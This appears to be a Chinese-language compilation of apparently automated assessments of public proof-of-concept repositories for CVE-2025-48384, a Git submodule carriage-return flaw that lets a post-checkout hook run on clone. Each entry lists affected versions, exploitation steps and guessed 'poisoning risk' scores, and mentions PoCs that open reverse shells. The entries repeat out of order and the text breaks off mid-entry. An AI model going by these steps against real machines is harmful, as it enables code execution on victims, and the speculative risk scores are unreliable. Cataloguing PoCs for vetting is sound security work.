**项目地址:** [vinieger/CVE-2025-48384-bad-nginx-submodule](https://github.com/vinieger/CVE-2025-48384-bad-nginx-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #32

**来源**: [CVE-2025-48384-vinieger_CVE-2025-48384-bad-nginx.md](../2025/CVE-2025-48384-vinieger_CVE-2025-48384-bad-nginx.md)

## CVE-2025-48384-Git Config Quoting Vulnerability

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致任意代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互(克隆恶意仓库或初始化包含恶意配置的子模块)

**POC 可用性:** 部分

**投毒风险:** 10%

## 详情

CVE-2025-48384 漏洞源于 Git 在处理配置引用时存在缺陷，允许攻击者通过精心构造的 Git 仓库或子模块执行任意代码。漏洞的利用方式是：攻击者创建一个恶意仓库，该仓库包含一个带有尾随回车符的子模块路径，并在子模块的 hooks 目录中放置恶意 post-checkout hook。当用户克隆该仓库或初始化包含恶意配置的子模块时，由于 Git 会错误地解析带有尾随回车符的子模块路径，导致子模块被检出到错误的位置。如果该错误位置恰好是一个指向子模块 hooks 目录的符号链接，并且子模块包含一个可执行的 post-checkout hook，则该脚本可能会在检出后被意外执行，从而导致代码执行。 

提供的 POC 代码 `/tmp/4295def0b61cc2e3ec2165152003d4b7/README.md` 看起来只是一个 README 文件，表明该仓库很可能是漏洞的利用示例或者演示。根据文件名`CVE-2025-48384-bad-nginx`推测,该代码仓库可能包含一个用于利用此漏洞的恶意Nginx配置。

**有效性：** 漏洞本身是有效的，因为多个来源都证实了它的存在。然而，仅凭提供的 POC 代码片段 `/tmp/4295def0b61cc2e3ec2165152003d4b7/README.md`无法判断具体的漏洞利用方式和有效性。需要查看完整的仓库内容才能确定其利用方式是否有效。

**投毒风险：** 仅根据提供的 README 文件，无法确定是否存在投毒代码。恶意代码可能隐藏在其他文件中（例如子模块的 hook 脚本或Nginx配置）。根据经验，安全研究人员倾向于展示漏洞利用过程,因此，仓库作者主动投毒的可能性较低，估计投毒风险为 10%。该仓库可能需要配合其他步骤,例如修改Nginx配置或者安装特定的依赖,来达到利用效果，这些步骤中可能包含潜在的风险。

**利用方式：** 攻击者诱导用户克隆包含恶意配置的仓库（带有尾随回车符的子模块路径以及恶意的post-checkout hook),从而触发代码执行。

由于搜索引擎返回了大量的相关信息，表明此漏洞是真实且被广泛关注的。SUSE和RedHat都发布了安全公告，更证明了该漏洞的存在。


**项目地址:** [vinieger/CVE-2025-48384-bad-nginx](https://github.com/vinieger/CVE-2025-48384-bad-nginx)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #33

**来源**: [CVE-2025-48384-vinieger_vinieger-CVE-2025-48384-Dockerfile.md](../2025/CVE-2025-48384-vinieger_vinieger-CVE-2025-48384-Dockerfile.md)

## CVE-2025-48384-Git配置注入导致任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/符号链接攻击

**影响应用:** Git

**危害等级:** 高危，允许攻击者执行任意代码

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库并递归初始化子模块，并需要用户交互

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384是Git中的一个漏洞，由于Git在处理配置文件时，会删除尾部的CRLF字符，导致如果子模块路径中包含尾部CR字符，则修改后的路径会被读取，导致子模块被检出到错误的位置。如果存在一个符号链接将更改后的路径指向子模块的hooks目录，并且子模块包含一个可执行的post-checkout hook，则在检出后可能会意外执行该脚本，从而导致任意代码执行。 

**有效性：**

根据提供的漏洞库信息和搜索引擎结果，以及POC代码，可以判断此POC有效。POC Dockerfile使用`apk`安装了受影响的Git版本（2.40.4），然后克隆了两个包含利用代码的Git仓库。Dockerfile中的CMD指令执行了`git clone --recurse-submodules`命令，这会触发漏洞利用。搜索引擎结果中也提到了此漏洞存在POC，并提供了利用示例，表明此漏洞可以被复现。

**投毒风险：**

分析Dockerfile的内容，主要的风险点集中在克隆的两个Git仓库：`https://github.com/vinieger/CVE-2025-48384.git`和`https://github.com/liamg/CVE-2025-48384-submodule.git`。

*   检查`vinieger/CVE-2025-48384`仓库，该仓库主要用于提供触发漏洞的配置，风险较低，因为目标是演示漏洞本身。
*   `liamg/CVE-2025-48384-submodule` 仓库，它用于提供恶意的子模块。恶意代码最可能存在于子模块的hooks目录中，尤其是post-checkout hook。该仓库需要仔细审查。考虑到其目的是为了利用漏洞，因此其存在恶意代码的可能性较高，但主要用于演示漏洞利用而非进行大规模攻击。因此，投毒风险相对较低，估计在10%左右，主要源于该仓库可能隐藏一些超出漏洞演示范围的恶意行为（例如，收集用户信息或尝试横向渗透）。

**利用方式：**

1.  攻击者创建一个包含恶意配置的Git仓库，该配置包括带有尾部CR字符的子模块路径。
2.  攻击者创建一个包含恶意post-checkout hook的子模块，并将该子模块托管在另一个Git仓库。
3.  攻击者创建一个符号链接，将带有尾部CR字符的子模块路径指向子模块的hooks目录。
4.  受害者克隆包含恶意配置的Git仓库，并使用`git clone --recurse-submodules`命令初始化子模块。
5.  Git在处理子模块路径时，会错误地将子模块检出到符号链接指向的目录，从而执行恶意post-checkout hook，导致任意代码执行。

**项目地址:** [vinieger/vinieger-CVE-2025-48384-Dockerfile](https://github.com/vinieger/vinieger-CVE-2025-48384-Dockerfile)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #34

**来源**: [CVE-2025-48384-won6c_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-won6c_CVE-2025-48384-submodule.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互（克隆恶意仓库）和存在易受攻击的 Git 版本。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 存在于 Git 中，源于其对配置中回车符处理不当。攻击者可以通过在 submodule 路径中注入回车符，导致 submodule 被检出到错误的位置。如果存在一个符号链接将该错误路径指向 submodule 钩子目录，且 submodule 包含可执行的 post-checkout 钩子，则在检出后可能会意外执行该脚本，造成任意代码执行。

**有效性：**
根据 arcticwolf.com 的搜索结果表明，此漏洞存在可用的 PoC。 提供的 PoC 代码 `/tmp/b95b758d8faf22baf81ee61a8796e533/README.md` 只是一个 dummy submodule 的 README 文件，本身不具备利用漏洞的能力。 完整的 PoC 应当包含恶意的 submodule 配置和 hook 文件。

**投毒风险：**
提供的 PoC 代码不包含任何恶意代码，因此投毒风险为 0%。 但是，实际利用中，攻击者会构建包含恶意 hook 脚本的 submodule，从而在用户克隆并初始化 submodule 时执行恶意代码。

**利用方式：**
1.  攻击者创建一个包含恶意 submodule 的 Git 仓库。
2.  在 submodule 的路径中注入回车符。
3.  创建一个符号链接，将包含回车符的错误路径指向 submodule 的钩子目录 (.git/hooks)。
4.  在 submodule 中添加一个恶意的 post-checkout 钩子脚本。
5.  诱导用户克隆该仓库并初始化 submodule (git submodule update --init --recursive)。
6.  当用户检出 submodule 时，由于路径包含回车符，submodule 会被检出到错误的位置，触发符号链接，执行钩子目录下的恶意脚本，从而实现任意代码执行。

**项目地址:** [won6c/CVE-2025-48384-submodule](https://github.com/won6c/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #35

**来源**: [CVE-2025-48384-wzx5002_totallynotsuspicious.md](../2025/CVE-2025-48384-wzx5002_totallynotsuspicious.md)

## CVE-2025-48384-Git-RCE

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 远程代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户克隆包含恶意配置的仓库或初始化包含恶意配置的子模块

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384是Git中的一个高危漏洞，源于Git在处理包含回车符的配置值时，读取和写入方式不一致。攻击者可以利用这个漏洞，通过构造包含恶意配置（例如，带有尾随回车符的子模块路径）的Git仓库，诱导受害者克隆该仓库，从而实现远程代码执行。具体利用方式是：

1.  **恶意仓库创建：** 攻击者创建一个包含恶意`.gitmodules`文件的Git仓库。该文件中的子模块路径包含一个尾随的回车符(`\r`)。
2.  **符号链接利用：** 当受害者使用`git submodule init`初始化子模块时，Git会错误地解析子模块路径。攻击者在仓库中创建一个符号链接，将错误的子模块路径指向`.git/hooks`目录。
3.  **恶意钩子：**  攻击者在子模块中包含一个恶意的`post-checkout`钩子脚本。该脚本会在`git checkout`操作后自动执行。
4.  **诱导受害者：** 攻击者诱导受害者克隆恶意仓库并初始化子模块（例如，通过`git clone --recursive`或手动执行`git submodule init`和`git submodule update`）。
5.  **代码执行：** 当受害者检出（checkout）仓库时，`post-checkout`钩子脚本会被执行，从而导致远程代码执行。

提供的PoC代码是一个反弹shell的`post-checkout`钩子脚本，如果成功执行，将允许攻击者控制受害者的系统。由于提供的poc代码功能单一,仅仅是反弹shell,没有进行额外的恶意代码操作,判定投毒风险为0%。根据搜索引擎结果，该漏洞已经被CISA添加到已知被利用的漏洞目录中，表明该漏洞在野外已被积极利用。


**项目地址:** [wzx5002/totallynotsuspicious](https://github.com/wzx5002/totallynotsuspicious)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---



---

## POC #30

**来源**: [CVE-2025-48384-testdjshan_CVE-2025-48384.md](../2025/CVE-2025-48384-testdjshan_CVE-2025-48384.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本：< 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 允许攻击者通过在 Git 配置文件中注入恶意代码来执行任意命令。漏洞利用主要围绕 Git 如何处理带有回车符的配置值。如果 submodule 路径包含尾随的回车符 (CR)，则修改后的路径会被读取，导致 submodule 被检出到错误的位置。如果存在一个符号链接，将修改后的路径指向 submodule hooks 目录，并且 submodule 包含一个可执行的 post-checkout hook，则该脚本可能会在检出后被意外执行，导致任意代码执行。

**有效性：**

根据漏洞库信息和搜索结果，此漏洞是有效的。已发布了针对此漏洞的修复程序。

**投毒风险：**

提供的 POC 代码包含以下文件：

*   `README.md`: 一个空的 README 文件
*   `sub`:  一个 `.git/modules/sub/hooks` 目录。

`sub` 目录本身并不包含任何可执行代码，仅仅是一个空的hooks目录，因此直接投毒的可能性较低。但是,攻击者可能在受害者执行 `git clone --recursive`后，通过 submodule 初始化过程创建恶意的 hooks 文件或者修改 `.gitmodules` 文件来间接投毒。因此，存在一定的投毒风险，但风险等级较低。

**利用方式：**

1.  **创建恶意仓库：** 攻击者创建一个包含恶意的 `.gitmodules` 文件的 Git 仓库。该文件中的 submodule 路径包含一个尾随的回车符 (CR)。
2.  **设置符号链接：**  在仓库中创建一个符号链接，该链接将包含回车符的路径指向 submodule 的 `hooks` 目录。
3.  **添加恶意 hook：**  在 submodule 的 `hooks` 目录中添加一个恶意的 post-checkout hook 脚本。当用户执行 `git clone --recursive` 命令时，Git 会将 submodule 检出到错误的位置，由于存在符号链接，恶意的 post-checkout hook 将会被执行，从而导致任意代码执行。

**风险分析：**

该漏洞的利用需要用户执行 `git clone --recursive` 命令，并且依赖于用户机器上的 Git 版本存在漏洞。攻击的复杂性较高，需要精心的构造恶意仓库，但是如果成功利用，可以导致远程代码执行，因此风险等级较高。

**搜索引擎结果分析：**

*   NVD 提供了漏洞的详细信息和更新记录。
*   Red Hat 将此漏洞标记为“重要”，强调了其对 Git 路径和配置完整性的威胁。
*   dgl.cx 的文章详细介绍了利用此漏洞进行 RCE 的方法。


**项目地址:** [testdjshan/CVE-2025-48384](https://github.com/testdjshan/CVE-2025-48384)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #31

**来源**: [CVE-2025-48384-vinieger_CVE-2025-48384-bad-nginx-submodule.md](../2025/CVE-2025-48384-vinieger_CVE-2025-48384-bad-nginx-submodule.md)

## CVE-2025-48384-Git配置注入导致任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/符号链接攻击

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互(克隆恶意仓库或初始化恶意子模块)

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞允许攻击者通过在 Git 配置中注入包含回车符的恶意数据来执行任意代码。该漏洞的核心在于 Git 处理配置文件中带有尾随回车符的值时存在缺陷。具体来说，当 Git 写入包含尾随回车符的配置条目时，它不会对该值进行引用，导致回车符在后续读取时丢失。这会影响子模块的初始化过程，如果子模块路径包含尾随回车符，则会导致子模块被检出到错误的位置。攻击者可以利用这一点，通过创建一个指向子模块 hooks 目录的符号链接，并在子模块中包含一个可执行的 post-checkout hook。当用户克隆包含恶意配置的仓库或初始化恶意子模块时，`post-checkout` 钩子会被执行，从而导致任意代码执行。

提供的POC利用代码通过`post-checkout` hook 替换系统中的nginx程序，连接攻击者的服务器，反弹shell。 

**漏洞利用方式：**

1.  攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。该文件包含一个子模块定义，其路径包含一个尾随回车符。
2.  攻击者在仓库中创建一个符号链接，将带有回车符的子模块路径指向 `.git/modules/<submodule>/hooks` 目录。
3.  攻击者在子模块的 hooks 目录中创建一个 `post-checkout` 钩子脚本，该脚本包含要执行的恶意代码。
4.  攻击者将恶意仓库托管在公共平台上或通过其他方式分发给目标用户。
5.  当目标用户克隆恶意仓库或初始化恶意子模块时，Git 会尝试将子模块检出到错误的位置，由于存在符号链接，实际上会将子模块检出到 `.git/modules/<submodule>/hooks` 目录。
6.  在子模块检出后，`post-checkout` 钩子脚本会被执行，从而导致攻击者指定的任意代码在目标系统上运行。

**有效性：**

该POC代码是有效的，可以用于利用 CVE-2025-48384 漏洞执行任意代码。

**投毒风险：**

该POC代码的功能明确，旨在利用该漏洞。从代码逻辑来看，并没有发现隐藏的恶意功能或者后门，可以判定没有投毒风险。

**搜索引擎结果分析：**

搜索结果表明该漏洞是Git配置注入/符号链接攻击漏洞，并且得到了安全社区的广泛关注，各大厂商都发布了安全更新。

**项目地址:** [vinieger/CVE-2025-48384-bad-nginx-submodule](https://github.com/vinieger/CVE-2025-48384-bad-nginx-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #32

**来源**: [CVE-2025-48384-vinieger_CVE-2025-48384-bad-nginx.md](../2025/CVE-2025-48384-vinieger_CVE-2025-48384-bad-nginx.md)

## CVE-2025-48384-Git Config Quoting Vulnerability

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致任意代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互(克隆恶意仓库或初始化包含恶意配置的子模块)

**POC 可用性:** 部分

**投毒风险:** 10%

## 详情

CVE-2025-48384 漏洞源于 Git 在处理配置引用时存在缺陷，允许攻击者通过精心构造的 Git 仓库或子模块执行任意代码。漏洞的利用方式是：攻击者创建一个恶意仓库，该仓库包含一个带有尾随回车符的子模块路径，并在子模块的 hooks 目录中放置恶意 post-checkout hook。当用户克隆该仓库或初始化包含恶意配置的子模块时，由于 Git 会错误地解析带有尾随回车符的子模块路径，导致子模块被检出到错误的位置。如果该错误位置恰好是一个指向子模块 hooks 目录的符号链接，并且子模块包含一个可执行的 post-checkout hook，则该脚本可能会在检出后被意外执行，从而导致代码执行。 

提供的 POC 代码 `/tmp/4295def0b61cc2e3ec2165152003d4b7/README.md` 看起来只是一个 README 文件，表明该仓库很可能是漏洞的利用示例或者演示。根据文件名`CVE-2025-48384-bad-nginx`推测,该代码仓库可能包含一个用于利用此漏洞的恶意Nginx配置。

**有效性：** 漏洞本身是有效的，因为多个来源都证实了它的存在。然而，仅凭提供的 POC 代码片段 `/tmp/4295def0b61cc2e3ec2165152003d4b7/README.md`无法判断具体的漏洞利用方式和有效性。需要查看完整的仓库内容才能确定其利用方式是否有效。

**投毒风险：** 仅根据提供的 README 文件，无法确定是否存在投毒代码。恶意代码可能隐藏在其他文件中（例如子模块的 hook 脚本或Nginx配置）。根据经验，安全研究人员倾向于展示漏洞利用过程,因此，仓库作者主动投毒的可能性较低，估计投毒风险为 10%。该仓库可能需要配合其他步骤,例如修改Nginx配置或者安装特定的依赖,来达到利用效果，这些步骤中可能包含潜在的风险。

**利用方式：** 攻击者诱导用户克隆包含恶意配置的仓库（带有尾随回车符的子模块路径以及恶意的post-checkout hook),从而触发代码执行。

由于搜索引擎返回了大量的相关信息，表明此漏洞是真实且被广泛关注的。SUSE和RedHat都发布了安全公告，更证明了该漏洞的存在。


**项目地址:** [vinieger/CVE-2025-48384-bad-nginx](https://github.com/vinieger/CVE-2025-48384-bad-nginx)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #33

**来源**: [CVE-2025-48384-vinieger_vinieger-CVE-2025-48384-Dockerfile.md](../2025/CVE-2025-48384-vinieger_vinieger-CVE-2025-48384-Dockerfile.md)

## CVE-2025-48384-Git配置注入导致任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 配置注入/符号链接攻击

**影响应用:** Git

**危害等级:** 高危，允许攻击者执行任意代码

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库并递归初始化子模块，并需要用户交互

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384是Git中的一个漏洞，由于Git在处理配置文件时，会删除尾部的CRLF字符，导致如果子模块路径中包含尾部CR字符，则修改后的路径会被读取，导致子模块被检出到错误的位置。如果存在一个符号链接将更改后的路径指向子模块的hooks目录，并且子模块包含一个可执行的post-checkout hook，则在检出后可能会意外执行该脚本，从而导致任意代码执行。 

**有效性：**

根据提供的漏洞库信息和搜索引擎结果，以及POC代码，可以判断此POC有效。POC Dockerfile使用`apk`安装了受影响的Git版本（2.40.4），然后克隆了两个包含利用代码的Git仓库。Dockerfile中的CMD指令执行了`git clone --recurse-submodules`命令，这会触发漏洞利用。搜索引擎结果中也提到了此漏洞存在POC，并提供了利用示例，表明此漏洞可以被复现。

**投毒风险：**

分析Dockerfile的内容，主要的风险点集中在克隆的两个Git仓库：`https://github.com/vinieger/CVE-2025-48384.git`和`https://github.com/liamg/CVE-2025-48384-submodule.git`。

*   检查`vinieger/CVE-2025-48384`仓库，该仓库主要用于提供触发漏洞的配置，风险较低，因为目标是演示漏洞本身。
*   `liamg/CVE-2025-48384-submodule` 仓库，它用于提供恶意的子模块。恶意代码最可能存在于子模块的hooks目录中，尤其是post-checkout hook。该仓库需要仔细审查。考虑到其目的是为了利用漏洞，因此其存在恶意代码的可能性较高，但主要用于演示漏洞利用而非进行大规模攻击。因此，投毒风险相对较低，估计在10%左右，主要源于该仓库可能隐藏一些超出漏洞演示范围的恶意行为（例如，收集用户信息或尝试横向渗透）。

**利用方式：**

1.  攻击者创建一个包含恶意配置的Git仓库，该配置包括带有尾部CR字符的子模块路径。
2.  攻击者创建一个包含恶意post-checkout hook的子模块，并将该子模块托管在另一个Git仓库。
3.  攻击者创建一个符号链接，将带有尾部CR字符的子模块路径指向子模块的hooks目录。
4.  受害者克隆包含恶意配置的Git仓库，并使用`git clone --recurse-submodules`命令初始化子模块。
5.  Git在处理子模块路径时，会错误地将子模块检出到符号链接指向的目录，从而执行恶意post-checkout hook，导致任意代码执行。

**项目地址:** [vinieger/vinieger-CVE-2025-48384-Dockerfile](https://github.com/vinieger/vinieger-CVE-2025-48384-Dockerfile)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #34

**来源**: [CVE-2025-48384-won6c_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-won6c_CVE-2025-48384-submodule.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互（克隆恶意仓库）和存在易受攻击的 Git 版本。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 存在于 Git 中，源于其对配置中回车符处理不当。攻击者可以通过在 submodule 路径中注入回车符，导致 submodule 被检出到错误的位置。如果存在一个符号链接将该错误路径指向 submodule 钩子目录，且 submodule 包含可执行的 post-checkout 钩子，则在检出后可能会意外执行该脚本，造成任意代码执行。

**有效性：**
根据 arcticwolf.com 的搜索结果表明，此漏洞存在可用的 PoC。 提供的 PoC 代码 `/tmp/b95b758d8faf22baf81ee61a8796e533/README.md` 只是一个 dummy submodule 的 README 文件，本身不具备利用漏洞的能力。 完整的 PoC 应当包含恶意的 submodule 配置和 hook 文件。

**投毒风险：**
提供的 PoC 代码不包含任何恶意代码，因此投毒风险为 0%。 但是，实际利用中，攻击者会构建包含恶意 hook 脚本的 submodule，从而在用户克隆并初始化 submodule 时执行恶意代码。

**利用方式：**
1.  攻击者创建一个包含恶意 submodule 的 Git 仓库。
2.  在 submodule 的路径中注入回车符。
3.  创建一个符号链接，将包含回车符的错误路径指向 submodule 的钩子目录 (.git/hooks)。
4.  在 submodule 中添加一个恶意的 post-checkout 钩子脚本。
5.  诱导用户克隆该仓库并初始化 submodule (git submodule update --init --recursive)。
6.  当用户检出 submodule 时，由于路径包含回车符，submodule 会被检出到错误的位置，触发符号链接，执行钩子目录下的恶意脚本，从而实现任意代码执行。

**项目地址:** [won6c/CVE-2025-48384-submodule](https://github.com/won6c/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #35

**来源**: [CVE-2025-48384-wzx5002_totallynotsuspicious.md](../2025/CVE-2025-48384-wzx5002_totallynotsuspicious.md)

## CVE-2025-48384-Git-RCE

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 远程代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户克隆包含恶意配置的仓库或初始化包含恶意配置的子模块

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384是Git中的一个高危漏洞，源于Git在处理包含回车符的配置值时，读取和写入方式不一致。攻击者可以利用这个漏洞，通过构造包含恶意配置（例如，带有尾随回车符的子模块路径）的Git仓库，诱导受害者克隆该仓库，从而实现远程代码执行。具体利用方式是：

1.  **恶意仓库创建：** 攻击者创建一个包含恶意`.gitmodules`文件的Git仓库。该文件中的子模块路径包含一个尾随的回车符(`\r`)。
2.  **符号链接利用：** 当受害者使用`git submodule init`初始化子模块时，Git会错误地解析子模块路径。攻击者在仓库中创建一个符号链接，将错误的子模块路径指向`.git/hooks`目录。
3.  **恶意钩子：**  攻击者在子模块中包含一个恶意的`post-checkout`钩子脚本。该脚本会在`git checkout`操作后自动执行。
4.  **诱导受害者：** 攻击者诱导受害者克隆恶意仓库并初始化子模块（例如，通过`git clone --recursive`或手动执行`git submodule init`和`git submodule update`）。
5.  **代码执行：** 当受害者检出（checkout）仓库时，`post-checkout`钩子脚本会被执行，从而导致远程代码执行。

提供的PoC代码是一个反弹shell的`post-checkout`钩子脚本，如果成功执行，将允许攻击者控制受害者的系统。由于提供的poc代码功能单一,仅仅是反弹shell,没有进行额外的恶意代码操作,判定投毒风险为0%。根据搜索引擎结果，该漏洞已经被CISA添加到已知被利用的漏洞目录中，表明该漏洞在野外已被积极利用。


**项目地址:** [wzx5002/totallynotsuspicious](https://github.com/wzx5002/totallynotsuspicious)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---



---

## POC #30

**来源**: [CVE-2025-48384-testdjshan_CVE-2025-48384.md](../2025/CVE-2025-48384-testdjshan_CVE-2025-48384.md)

## CVE-2025-48384-Git-任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本：< 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 允许攻击者通过在 Git 配置文件中注入恶意代码来执行任意命令。漏洞利用主要围绕 Git 如何处理带有回车符的配置值。如果 submodule 路径包含尾随的回车符 (CR)，则修改后的路径会被读取，导致 submodule 被检出到错误的位置。如果存在一个符号链接，将修改后的路径指向 submodule hooks 目录，并且 submodule 包含一个可执行的 post-checkout hook，则该脚本可能会在检出后被意外执行，导致任意代码执行。

**有效性：**

根据漏洞库信息和搜索结果，此漏洞是有效的。已发布了针对此漏洞的修复程序。

**投毒风险：**

提供的 POC 代码包含以下文件：

*   `README.md`: 一个空的 README 文件
*   `sub`:  一个 `.git/modules/sub/hooks` 目录。

`sub` 目录本身并不包含任何可执行代码，仅仅是一个空的hooks目录，因此直接投毒的可能性较低。但是,攻击者可能在受害者执行 `git clone --recursive`后，通过 submodule 初始化过程创建恶意的 hooks 文件或者修改 `.gitmodules` 文件来间接投毒。因此，存在一定的投毒风险，但风险等级较低。

**利用方式：**

1.  **创建恶意仓库：** 攻击者创建一个包含恶意的 `.gitmodules` 文件的 Git 仓库。该文件中的 submodule 路径包含一个尾随的回车符 (CR)。
2.  **设置符号链接：**  在仓库中创建一个符号链接，该链接将包含回车符的路径指向 submodule 的 `hooks` 目录。
3.  **添加恶意 hook：**  在 submodule 的 `hooks` 目录中添加一个恶意的 post-checkout hook 脚本。当用户执行 `git clone --recursive` 命令时，Git 会将 submodule 检出到错误的位置，由于存在符号链接，恶意的 post-checkout hook 将会被执行，从而导致任意代码执行。

**风险分析：**

该漏洞的利用需要用户执行 `git clone --recursive` 命令，并且依赖于用户机器上的 Git 版本存在漏洞。攻击的复杂性较高，需要精心的构造恶意仓库，但是如果成功利用，可以导致远程代码执行，因此风险等级较高。

**搜索引擎结果分析：**

*   NVD 提供了漏洞的详细信息和更新记录。
